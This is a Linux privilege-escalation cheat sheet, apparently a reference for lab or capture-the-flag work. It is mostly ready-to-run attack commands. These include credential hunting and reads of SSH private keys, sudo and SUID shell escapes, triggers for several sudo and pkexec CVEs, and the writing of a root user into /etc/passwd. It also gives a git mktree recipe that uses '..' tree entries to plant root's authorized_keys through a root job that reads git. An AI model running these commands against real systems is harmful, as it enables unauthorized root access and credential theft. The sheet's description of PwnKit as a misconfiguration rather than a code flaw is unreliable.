# Linux privilege escalation

Enumerate manually first — the checks below take 60 seconds and find the
intended path most of the time. Run linpeas as a backstop, not as step one; its
output is long and easy to drown in.

## Manual sweep

```bash
id; sudo -l
uname -a; cat /etc/os-release
cat /etc/passwd | grep -v nologin
ls -la /home/*; ls -la ~
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # capabilities
cat /etc/crontab; ls -la /etc/cron.*
ps aux --forest | head -60
netstat -tulpn 2>/dev/null || ss -tulpn            # internal-only services
find / -writable -type d 2>/dev/null | grep -v proc | head
```

Credential hunting:
```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /opt /home /etc 2>/dev/null | grep -v Binary | head -50
ls -la /var/backups /tmp /opt
cat ~/.bash_history; cat ~/.ssh/id_*
find / -name '*.kdbx' -o -name '.env' -o -name 'config.php' -o -name 'wp-config.php' 2>/dev/null
```

## sudo -l

The single highest-yield check. Any allowed binary → look it up on GTFOBins:
```
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile      # then !/bin/sh
```
`env_keep+=LD_PRELOAD` present → compile a shared object with a `_init` that
spawns a shell, then `sudo LD_PRELOAD=/tmp/x.so <anything>`. `LD_LIBRARY_PATH`
kept works the same way with a fake `libc`.
Wildcards in a sudo rule (`sudo /bin/tar -czf /tmp/x /var/www/*`) → checkpoint
injection or filename-as-argument tricks.
`(ALL, !root)` in older sudo → CVE-2019-14287, `sudo -u#-1 /bin/bash`.
Sudo `< 1.9.5p2` → Baron Samedit (CVE-2021-3156), a heap overflow reachable with
**no sudo rights at all** (`sudoedit -s '\' $(perl -e 'print "A"x1000')` to
confirm it segfaults). `sudo -l` needing no password after you already ran one →
a live sudo token you can reuse.

Quick classes the sweep already surfaced:
- **Writable `/etc/passwd`** → add a root-uid user with a known hash
  (`openssl passwd -1`), `su` to it. Writable `/etc/shadow` → same idea.
- **PATH hijack** → a root cron/SUID/script calling a bare command (`tar`, not
  `/bin/tar`) with a PATH you can prepend → drop a malicious `tar` first in PATH.
- **PwnKit (CVE-2021-4034)** — `pkexec` present and SUID is the give-away; a
  config bug, not a kernel bug, so it's safe to try early on older images.
- **polkit/D-Bus** → `busctl list` for services running as root that expose a
  method you can call (e.g. `CreateUser`, package-install actions).

## SUID / capabilities

Compare the SUID list against a stock system — anything unusual is the path.
GTFOBins again for the standard binaries. `cap_setuid+ep` on python/perl:
```bash
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Cron, timers and custom scripts

```bash
./pspy64                                    # jobs /etc/crontab does not list
systemctl list-timers --all --no-pager      # systemd timers are not in crontab
ls -la /etc/cron.d /etc/cron.*/ /etc/systemd/system/*.service
```
A root cron running a script you can write, or running a relative path with a
writable PATH component, is a direct win. Also check for `tar`/`rsync`
wildcards in cron commands.

**Read any custom script you can, even when you cannot write it.** A
world-readable script run by root is worth more than a config file you cannot
read, because it tells you what root does with data you might control. Work
through it asking: where does its input come from, and can I influence that
input? Check the unit for `User=` and the log file's owner to confirm what it
runs as:

```bash
cat /etc/systemd/system/<name>.service | grep -E 'User=|ExecStart='
ls -la /var/log/<name>.log
```

The recurring bug class is a root job joining an attacker-influenced name onto a
directory:

```python
target = os.path.join(base_dir, name_from_untrusted_source)   # no containment check
```

`os.path.join` does not normalise `..`, and it *discards* `base_dir` entirely if
the second argument is absolute. Anything that feeds it filenames from a
database, an API response, an archive, or a git tree is a candidate for
arbitrary file write as root. Useful targets, in order of cleanliness:
`/root/.ssh/authorized_keys` (additive, reversible), a file in `/etc/cron.d`
(needs mode 0644), a script in `/etc/cron.hourly` (needs the execute bit).

Note that `git` is a common untrusted source here — and that git's own
restrictions are a porcelain behaviour, not a format one. `git add` refuses a
path containing `..`, but tree objects are just name-to-hash maps and
`git mktree` writes them directly:

```bash
BLOB=$(cat payload | git hash-object -w --stdin)
T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T=$(printf '040000 tree %s\t.ssh\n' "$T" | git mktree)
T=$(printf '040000 tree %s\troot\n' "$T" | git mktree)
for i in $(seq 1 5); do T=$(printf '040000 tree %s\t..\n' "$T" | git mktree); done
C=$(echo x | git commit-tree "$T"); git update-ref refs/heads/main "$C"
git ls-tree -r HEAD     # verify the path the consumer will see
```

Count the `..` levels against the consumer's base directory, and confirm with
`git ls-tree -r` before pushing. Forges do not fsck incoming objects by default,
so such a tree usually survives a push.

## Services and internal ports

Something listening on 127.0.0.1 that is not exposed externally is usually
where the escalation lives — an unauthenticated admin panel, a Redis, a
database. Forward it out (see `references/pivoting.md`) and attack it.

## Password reuse

Every password you have found, tried against every user in `/etc/passwd`, plus
`su`. This resolves a large fraction of lab boxes and costs nothing.

## Containers

If `/.dockerenv` exists, the cgroup shows docker/lxc, or `hostname` is a short
hex — you're in a container, and "root" here is not the host. The escape is
usually a mounted socket or an over-broad capability, not a kernel bug. Full
escape catalog (docker.sock, privileged, `CAP_SYS_ADMIN` release_agent,
`SYS_PTRACE`, `SYS_MODULE`, host mounts, `/proc` tricks) is in
**`references/containers.md`**.

If there is a Kubernetes service account (`/var/run/secrets/kubernetes.io/…`) or
the host runs a cluster (k3s/kubeadm/microk8s), the container is usually one step
of a larger chain — enumerate the SA's RBAC and the kubelet before reaching for a
local exploit. See `references/kubernetes.md`.

## Kernel exploits — last resort

Only when enumeration is genuinely exhausted. They crash lab boxes and
demonstrate nothing interesting. If you must: match the exact kernel version,
prefer a well-reviewed PoC (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034,
Dirty COW on ancient boxes), and note that PwnKit is a `pkexec` misconfiguration
rather than a kernel bug — check for it early, it is common on older lab images.

## Confirm and record

```bash
id                  # uid=0(root)
cat /root/root.txt
```
Write the escalation vector and its evidence file into FINDINGS.md before
moving on to the report.
